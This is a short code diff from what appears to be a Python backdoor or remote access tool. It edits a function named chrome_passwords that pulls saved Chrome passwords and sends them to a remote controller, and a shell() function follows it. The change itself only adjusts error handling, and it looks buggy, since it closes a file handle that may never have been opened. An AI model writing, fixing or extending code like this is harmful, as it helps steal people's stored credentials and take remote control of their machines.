@@ -169,8 +169,10 @@ def chrome_passwords():
         passwords = chrome.chrome_pass()
         fn = open(passwords,"r")
         reliable_send(fn.read())
-    except:
-        reliable_send('[-] Error getting passwords from chrome')
+        fn.close()
+    except Exception as e:
+        fn.close()
+        reliable_send('[-] Error getting passwords from chrome',e)
 
 
 def shell():
